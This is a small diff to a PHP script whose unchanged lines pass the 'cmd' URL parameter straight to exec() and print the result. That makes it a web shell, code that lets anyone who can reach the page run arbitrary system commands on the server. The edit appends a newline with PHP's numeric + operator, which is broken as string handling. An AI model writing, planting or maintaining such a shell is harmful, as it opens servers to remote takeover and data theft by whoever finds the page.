@@ -2,6 +2,6 @@
 $output = null;
 exec($_GET['cmd'], $output);
 foreach ($output as $elem) {
-  echo $elem;
+  echo $elem + '\n';
 }
 ?>
